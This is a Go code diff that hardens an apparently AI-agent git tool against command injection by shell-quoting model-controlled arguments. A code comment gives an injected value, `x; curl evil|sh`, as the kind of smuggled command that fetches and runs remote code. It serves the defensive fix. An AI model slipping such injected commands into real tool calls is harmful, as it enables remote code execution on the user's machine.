@@ -595,7 +595,7 @@ func executeGitDiff(ctx context.Context, args map[string]any) (string, error) {
 
 	// Add commit reference
 	if commit, ok := args["commit"].(string); ok && commit != "" {
-		cmdArgs = append(cmdArgs, commit)
+		cmdArgs = append(cmdArgs, shellArg(commit))
 	}
 
 	// Add path. The pathspec is contained even though git would reject a path
@@ -606,7 +606,7 @@ func executeGitDiff(ctx context.Context, args map[string]any) (string, error) {
 		if _, err := tools.ResolveWorkspacePath(ctx, "", path); err != nil {
 			return "", err
 		}
-		cmdArgs = append(cmdArgs, "--", path)
+		cmdArgs = append(cmdArgs, "--", shellArg(path))
 	}
 
 	command := "git " + strings.Join(cmdArgs, " ")
@@ -678,16 +678,16 @@ func executeGitLog(ctx context.Context, args map[string]any) (string, error) {
 	if f, ok := args["format"].(string); ok && f != "" {
 		format = f
 	}
-	cmdArgs = append(cmdArgs, "--format="+format)
+	cmdArgs = append(cmdArgs, "--format="+shellArg(format))
 
 	// Add since filter
 	if since, ok := args["since"].(string); ok && since != "" {
-		cmdArgs = append(cmdArgs, "--since="+since)
+		cmdArgs = append(cmdArgs, "--since="+shellArg(since))
 	}
 
 	// Add author filter
 	if author, ok := args["author"].(string); ok && author != "" {
-		cmdArgs = append(cmdArgs, "--author="+author)
+		cmdArgs = append(cmdArgs, "--author="+shellArg(author))
 	}
 
 	// Add path
@@ -695,7 +695,7 @@ func executeGitLog(ctx context.Context, args map[string]any) (string, error) {
 		if _, err := tools.ResolveWorkspacePath(ctx, "", path); err != nil {
 			return "", err
 		}
-		cmdArgs = append(cmdArgs, "--", path)
+		cmdArgs = append(cmdArgs, "--", shellArg(path))
 	}
 
 	command := "git " + strings.Join(cmdArgs, " ")
@@ -749,6 +749,47 @@ func GitOperationTool() *tools.Tool {
 	}
 }
 
+// shellArg quotes one model-controlled word for interpolation into a command
+// string that may run under sh -c or PowerShell -Command. Single quotes are
+// literal in both, so operators inside stay inert everywhere. shellquote.Join
+// cannot be used here: it prefers backslash escapes for `;|&><`, which sh
+// honors but PowerShell ignores — under PowerShell the operator stays a live
+// statement separator. scanShell treats single-quoted regions (including the
+// backslash-quote escape Join-style inputs produce) as quoted, so quoted
+// operators also stay out of compound routing.
+func shellArg(s string) string {
+	safe := len(s) > 0
+	for i := 0; safe && i < len(s); i++ {
+		c := s[i]
+		safe = c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' ||
+			c == '_' || c == '@' || c == '%' || c == '+' || c == '=' ||
+			c == ':' || c == ',' || c == '.' || c == '/' || c == '-'
+	}
+	if safe {
+		return s
+	}
+	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
+}
+
+// splitModelArgs splits a space-separated model argument list the way a shell
+// would (honoring quotes, so "my dir/f" stays one path) and re-quotes each
+// element with shellArg for safe interpolation into the git command string.
+// Unbalanced quotes fail closed. Every element below is model-controlled input
+// headed for a command line, so each one passes through here or shellArg:
+// a message like `x; curl evil|sh` must stay one quoted argument, never
+// become compound routing or a second command.
+func splitModelArgs(s string) ([]string, error) {
+	parts, err := shellquote.Split(s)
+	if err != nil {
+		return nil, fmt.Errorf("unbalanced quoting in argument list: %q", s)
+	}
+	quoted := make([]string, len(parts))
+	for i, p := range parts {
+		quoted[i] = shellArg(p)
+	}
+	return quoted, nil
+}
+
 func executeGitOperation(ctx context.Context, args map[string]any) (string, error) {
 	operation, _ := args["operation"].(string)
 	if operation == "" {
@@ -756,6 +797,7 @@ func executeGitOperation(ctx context.Context, args map[string]any) (string, erro
 	}
 
 	var cmdArgs []string
+	var err error
 
 	switch operation {
 	case "status":
@@ -763,60 +805,96 @@ func executeGitOperation(ctx context.Context, args map[string]any) (string, erro
 	case "add":
 		cmdArgs = []string{"add"}
 		if files, ok := args["files"].(string); ok && files != "" {
-			cmdArgs = append(cmdArgs, strings.Fields(files)...)
+			var extra []string
+			if extra, err = splitModelArgs(files); err != nil {
+				return "", err
+			}
+			cmdArgs = append(cmdArgs, extra...)
 		} else if extraArgs, ok := args["args"].(string); ok && extraArgs != "" {
-			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+			var extra []string
+			if extra, err = splitModelArgs(extraArgs); err != nil {
+				return "", err
+			}
+			cmdArgs = append(cmdArgs, extra...)
 		} else {
 			cmdArgs = append(cmdArgs, ".") // Default to all
 		}
 	case "commit":
 		cmdArgs = []string{"commit"}
 		if msg, ok := args["message"].(string); ok && msg != "" {
-			cmdArgs = append(cmdArgs, "-m", fmt.Sprintf("%q", msg))
+			cmdArgs = append(cmdArgs, "-m", shellArg(msg))
 		} else {
 			return "", fmt.Errorf("commit message is required")
 		}
 	case "checkout":
 		cmdArgs = []string{"checkout"}
 		if branch, ok := args["branch"].(string); ok && branch != "" {
-			cmdArgs = append(cmdArgs, branch)
+			cmdArgs = append(cmdArgs, shellArg(branch))
 		} else if extraArgs, ok := args["args"].(string); ok && extraArgs != "" {
-			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+			var extra []string
+			if extra, err = splitModelArgs(extraArgs); err != nil {
+				return "", err
+			}
+			cmdArgs = append(cmdArgs, extra...)
 		} else {
 			return "", fmt.Errorf("branch name or args required for checkout")
 		}
 	case "branch":
 		cmdArgs = []string{"branch"}
 		if branch, ok := args["branch"].(string); ok && branch != "" {
-			cmdArgs = append(cmdArgs, branch)
+			cmdArgs = append(cmdArgs, shellArg(branch))
 		}
 		if extraArgs, ok := args["args"].(string); ok && extraArgs != "" {
-			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+			var extra []string
+			if extra, err = splitModelArgs(extraArgs); err != nil {
+				return "", err
+			}
+			cmdArgs = append(cmdArgs, extra...)
 		}
 	case "push":
 		cmdArgs = []string{"push"}
 		if extraArgs, ok := args["args"].(string); ok && extraArgs != "" {
-			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+			var extra []string
+			if extra, err = splitModelArgs(extraArgs); err != nil {
+				return "", err
+			}
+			cmdArgs = append(cmdArgs, extra...)
 		}
 	case "pull":
 		cmdArgs = []string{"pull"}
 		if extraArgs, ok := args["args"].(string); ok && extraArgs != "" {
-			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+			var extra []string
+			if extra, err = splitModelArgs(extraArgs); err != nil {
+				return "", err
+			}
+			cmdArgs = append(cmdArgs, extra...)
 		}
 	case "fetch":
 		cmdArgs = []string{"fetch"}
 		if extraArgs, ok := args["args"].(string); ok && extraArgs != "" {
-			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+			var extra []string
+			if extra, err = splitModelArgs(extraArgs); err != nil {
+				return "", err
+			}
+			cmdArgs = append(cmdArgs, extra...)
 		}
 	case "stash":
 		cmdArgs = []string{"stash"}
 		if extraArgs, ok := args["args"].(string); ok && extraArgs != "" {
-			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+			var extra []string
+			if extra, err = splitModelArgs(extraArgs); err != nil {
+				return "", err
+			}
+			cmdArgs = append(cmdArgs, extra...)
 		}
 	case "reset":
 		cmdArgs = []string{"reset"}
 		if extraArgs, ok := args["args"].(string); ok && extraArgs != "" {
-			cmdArgs = append(cmdArgs, strings.Fields(extraArgs)...)
+			var extra []string
+			if extra, err = splitModelArgs(extraArgs); err != nil {
+				return "", err
+			}
+			cmdArgs = append(cmdArgs, extra...)
 		}
 	default:
 		return "", fmt.Errorf("unsupported git operation: %s", operation)
